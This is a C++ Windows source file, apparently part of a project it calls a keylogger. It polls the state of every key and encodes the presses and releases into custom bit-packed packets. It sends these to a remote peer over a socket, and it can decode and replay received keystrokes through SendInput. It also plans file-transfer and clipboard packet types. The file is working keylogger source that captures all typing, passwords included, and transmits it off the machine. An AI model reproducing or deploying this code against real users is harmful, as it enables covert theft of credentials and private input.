#include <cstdint>
#include <iostream>
#include <string>
#include <fstream>
#include <unordered_set>
#include <chrono>
#include <atomic>
#include <cmath>
#include <cassert>
#include <bitset>
#ifdef _WIN32
#include <winsock2.h>
#include <Windows.h>
#include <winuser.h>
#include <ws2tcpip.h>
#endif
#include "keylogger.hpp"
#define ARRAY_SIZE 32
#define DEBOUNCE_DURATION 50

#define KEYEVENT_SIZE 9

char parsePacket(char * buffer, int numBits){
    if(numBits < 1)return ' ';
    uint8_t header = buffer[0];
    int type = (header & (0b11<<6)) >>6;
    char ascii = ' ';
    if(type ==0){
        // std::cout<<"keylogging packet"<<std::endl;
        int numKeystrokes = (header & (0b1111<<2))>>2;

        // std::cout<<"num keystrokes"<<numKeystrokes<<std::endl;
        int operatingSystem = (header &(0b10)>>1);
        // std::cout<<"operating system"<<operatingSystem<<std::endl;
        int currentbitIndex = 0;

        std::vector<uint16_t> keystrokes(numKeystrokes);
        for(int i =1; i <= numKeystrokes; i++){

            char currentByte =  buffer[i];

            uint16_t keystroke = (((0b1 <<(8-currentbitIndex))-1) & currentByte)<<(1+currentbitIndex);
            keystroke = keystroke | ((buffer[i+1] & (((0b1 <<(1+currentbitIndex))-1)<<(7-currentbitIndex))) >>(7-currentbitIndex));
            keystrokes[i-1] = keystroke;
            currentbitIndex++;

        }
        BYTE keyboardState[256];

        if (!GetKeyboardState(keyboardState)) {
            return ' ';
        }
        WORD asciiValue;

        for(int j = 0; j < numKeystrokes; j++){
            uint16_t keystroke = keystrokes[j];
            BYTE keyCode = keystroke & 0xFF;
            int result = ToAscii(keyCode, MapVirtualKey(keyCode, MAPVK_VK_TO_VSC), keyboardState, &asciiValue, 0);
            ascii = static_cast<char>(asciiValue);
            if(((keystroke & (0b1<<8))>>8) != 0){

                std::cout<<"key pressed "<<ascii<<std::endl;
            }else{
                std::cout<<"key released "<<ascii<<std::endl;
            }
        }

    }

    return ascii;

}


std::vector<std::pair<BYTE,bool>> decodePacket(char * packet, int numBits){
    if(numBits < 1)return {};
    uint8_t header = packet[0];
    int type = (header & (0b11<<6)) >>6;
    char ascii = ' ';
    if(type ==0){
        int numKeystrokes = (header & (0b1111<<2))>>2;

        int currentbitIndex = 0;

        std::vector<uint16_t> keystrokes(numKeystrokes);
        for(int i =1; i <= numKeystrokes; i++){

            char currentByte =  packet[i];

            uint16_t keystroke = (((0b1 <<(8-currentbitIndex))-1) & currentByte)<<(1+currentbitIndex);
            keystroke = keystroke | ((packet[i+1] & (((0b1 <<(1+currentbitIndex))-1)<<(7-currentbitIndex))) >>(7-currentbitIndex));
            keystrokes[i-1] = keystroke;
            currentbitIndex++;
        }

        std::vector<std::pair<BYTE,bool>> keyEvents(numKeystrokes);

        for(int j = 0; j < numKeystrokes; j++){
        
            uint16_t keystroke = keystrokes[j];
            BYTE key = static_cast<BYTE>(keystroke & 0xFF);

            bool keyState = (keystroke >> 8) & 0x1;

            keyEvents[j] = std::make_pair(key, keyState);
        }
        return keyEvents;
    }
    return {};
}

void simulateKeystrokes(const std::vector<std::pair<BYTE, bool>>& keyEvents) {
    std::vector<INPUT> inputs;

    // Loop through each key event and prepare the INPUT structure
    for (const auto& keyEvent : keyEvents) {
        BYTE vkCode = keyEvent.first;      // Virtual key code
        bool isPressed = keyEvent.second;  // Key press state

        INPUT input = {0};  // Initialize the input structure to zero

        // Check if the vkCode corresponds to a mouse button (0x01 to 0x07)
        if (vkCode <= 0x07) {
            input.type = INPUT_MOUSE;
            if (isPressed) {
                // Mouse button press
                switch (vkCode) {
                    case 0x01: input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN; break;  // Left button down
                    case 0x02: input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN; break; // Right button down
                    case 0x04: input.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN; break; // Middle button down
                    case 0x05: input.mi.dwFlags = MOUSEEVENTF_XDOWN; break; // X button 1 down
                    case 0x06: input.mi.dwFlags = MOUSEEVENTF_XUP; break; // X button 2 down
                    default: break;
                }
            } else {
                // Mouse button release
                switch (vkCode) {
                    case 0x01: input.mi.dwFlags = MOUSEEVENTF_LEFTUP; break; // Left button up
                    case 0x02: input.mi.dwFlags = MOUSEEVENTF_RIGHTUP; break; // Right button up
                    case 0x04: input.mi.dwFlags = MOUSEEVENTF_MIDDLEUP; break; // Middle button up
                    case 0x05: input.mi.dwFlags = MOUSEEVENTF_XUP; break; // X button 1 up
                    case 0x06: input.mi.dwFlags = MOUSEEVENTF_XUP; break; // X button 2 up
                    default: break;
                }
            }
        } else {
            // If vkCode corresponds to a keyboard key (above 0x07)
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = vkCode;  // Set the virtual key code

            if (isPressed) {
                input.ki.dwFlags = 0;  // Key press
            } else {
                input.ki.dwFlags = KEYEVENTF_KEYUP;    // Key release
            }
        }

        inputs.push_back(input);
    }

    // Send the input events to the system
    SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
}

void updateKeyState(uint8_t vkCode, bool pressed, std::array<uint8_t, ARRAY_SIZE>& keyStates) {
    if (vkCode < 256) {    
        // std::cout<<"Key code in range"<<static_cast<int>(vkCode)<<std::endl;
        size_t byteIndex = vkCode / 8;        
        size_t bitIndex = vkCode % 8; 
        if (pressed) {
            keyStates[byteIndex] |= (1 << bitIndex);        
        } else {
            keyStates[byteIndex] &= ~(1 << bitIndex);
        }
    } else {
        std::cout << "Virtual key code out of range" << std::endl;
        
    }
}

bool isBitSet(const std::array<uint8_t, ARRAY_SIZE>& keyStates, uint8_t vkCode) {
    if (vkCode >= 256) {
        return false; // Out of range
    }

    size_t byteIndex = vkCode / 8;
    size_t bitIndex = vkCode % 8;

    return (keyStates[byteIndex] & (1 << bitIndex)) != 0;
}


std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
                                     const std::vector<BYTE>& pastKeys,
                                      std::array<uint8_t, ARRAY_SIZE>& bitmask,
                                     std::unordered_map<BYTE, std::chrono::steady_clock::time_point>& keyPressTimes) {
    std::unordered_set<BYTE> currentKeySet(currentKeys.begin(), currentKeys.end());
    std::unordered_set<BYTE> pastKeySet(pastKeys.begin(), pastKeys.end());
    std::vector<uint32_t> result;
    std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
    std::vector<uint8_t> smallResult;
    //checking for key releases
    for (BYTE key : pastKeySet) {
        if (currentKeySet.find(key) == currentKeySet.end() && isBitSet(bitmask, key)) {
            // // Key was in past but not pressed now, meaning it was released
            // result.push_back("Key " + std::to_string(key) + " was released");
            // updateKeyState(key, false, bitmask);
            std::unordered_map<BYTE, std::chrono::steady_clock::time_point>::iterator lastPressTime = keyPressTimes.find(key);
            if (lastPressTime != keyPressTimes.end() &&
                std::chrono::duration_cast<std::chrono::milliseconds>(now - lastPressTime->second).count() >= DEBOUNCE_DURATION) {
                // Key was in past but not pressed now, meaning it was released
                uint32_t key32 = static_cast<uint32_t>(key);
                result.push_back(key32);
                smallResult.push_back(key);
                updateKeyState(key, false, bitmask);
                keyPressTimes.erase(key); // Remove key from map
            }
        }
    }
    //checking for key presses
    for (BYTE key : currentKeySet) {
        if (std::find(pastKeySet.begin(), pastKeySet.end(), key) == pastKeySet.end() && !isBitSet(bitmask, key)) {
            if (keyPressTimes.find(key) == keyPressTimes.end() ||
                std::chrono::duration_cast<std::chrono::milliseconds>(now - keyPressTimes[key]).count() >= DEBOUNCE_DURATION) {
                // Key is newly pressed
                uint32_t key32 = static_cast<uint32_t> (key);
                key32 = key32 | (1<<8);
                result.push_back(key32);
                smallResult.push_back(key);
                updateKeyState(key, true, bitmask);
                keyPressTimes[key] = now; // Update the time of the key press
            }
        }
    }

    // return smallResult;
    return result;
}
//header idea for now, first 2 bits showing what type of packet this is 00: keystrokes , 01: file transfer, 10: clipboard copying, 11:system message
//next 4 bytes are amount of keys pressed, if more than 15 keys are pressed, send 15 then send the remainder after in a seperate packet
//next bit showing what operating system this comes from, 1 for windows, 0 for linux, going to add linux compatibility so 
//last bit is if encoded or not. this bit can be changed for a different use later
std::vector<uint32_t> packetize(std::vector<uint32_t> keystrokes){
std::cout << "keystroke amount to be packetized : " << keystrokes.size() << std::endl;
    std::vector<uint32_t> packets;
    uint32_t packet = 0;
    size_t numKeystrokes = keystrokes.size();
    int numBitsLeft = 32; 
    uint8_t header = (numKeystrokes << 2) | 0b10; 
    packet |= header << 24;
    numBitsLeft -= 8; 
    for (size_t i = 0; i < numKeystrokes; ++i) {
        if (numBitsLeft >= KEYEVENT_SIZE) {
            packet |= (keystrokes[i] << (numBitsLeft - KEYEVENT_SIZE));
            numBitsLeft -= KEYEVENT_SIZE;  
        } else {
            packets.push_back(packet);  
            packet = keystrokes[i] >> (KEYEVENT_SIZE - numBitsLeft);  
            packets.push_back(packet);  
            numBitsLeft = 32 - (KEYEVENT_SIZE - numBitsLeft);
        }
    }

    // If there's any leftover data in the last packet, add it to the packets vector
    if (numBitsLeft < 32 && packet != 0) {
        packets.push_back(packet);
    }

    std::cout << "number of packets needed to send : " << packets.size() << std::endl;
    return packets;
}

void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
    std::vector<BYTE> currentKeys; 
    std::vector<BYTE> pastKeys; 
    std::array<uint8_t, ARRAY_SIZE> keyStates = { 0 };
    std::vector<std::string> output;

    std::unordered_map<BYTE, std::chrono::steady_clock::time_point> keyPressTimes;
    std::chrono::milliseconds debounceDuration = std::chrono::milliseconds(DEBOUNCE_DURATION);

    while (running) {    
        currentKeys.clear();

        for (BYTE vkCode = 0; vkCode < 255; ++vkCode) {
            if (GetAsyncKeyState(vkCode) & 0x8000) { // Check if the key is pressed
                currentKeys.push_back(vkCode);
            }
        }

        // std::vector<std::string> changes = findChanges(currentKeys, pastKeys, keyStates, keyPressTimes);
        std::vector<uint32_t> changes = findChanges(currentKeys, pastKeys, keyStates, keyPressTimes);
        
        if(changes.size() !=0){
            std::vector<uint32_t> packets = packetize(changes);
            for(uint32_t byte : packets){
                std::bitset<32> binary(byte);
                std::cout<<binary<<std::endl;
            }
            std::cout<<std::endl;

            size_t totalBits = 8 + 9 * changes.size(); // Calculate total bits needed
            size_t byteSize = (totalBits + 7) / 8; // Round up to nearest byte
            std::vector<char> buffer(byteSize); // Create a buffer

            for(int i =0; i < byteSize; i++){
                // buffer[i] = (packets[i/(sizeof(uint32_t))] >>(8*(3-(i %(sizeof(uint32_t)))))) & 0xFF;
                size_t packetIndex = i / sizeof(uint32_t); // Index into the packets array
                size_t bytePosition = 3 - (i % sizeof(uint32_t)); // Position of the byte in the 32-bit word

                std::cout << "packetIndex: " << packetIndex << ", packets.size(): " << packets.size() << std::endl;
                assert(packetIndex<packets.size() && "Index out of range 3");
                buffer[i] = (packets[packetIndex] >> (8 * bytePosition)) & 0xFF;
            }
            std::cout<<"printing what will be sent"<<std::endl;
            for (size_t i = 0; i < buffer.size(); i++) {
                // Cast the char to unsigned to avoid issues with sign extension
                std::bitset<8> bits(static_cast<unsigned char>(buffer[i]));
                std::cout << "Byte " << i << ": " << bits << std::endl;
            }
            
            // const char* buffer = reinterpret_cast<const char*>(packets.data());
            // packets.size() * sizeof(uint32_t)
            size_t bytesSent = send(clientFD, buffer.data(),buffer.size() , 0);
            if (bytesSent == SOCKET_ERROR) {
                std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            } else {
                std::cout << "Bytes sent: " << bytesSent << std::endl;
            }
        }
        pastKeys = currentKeys;  

        Sleep(100); // Sleep to reduce CPU usage
    }
}
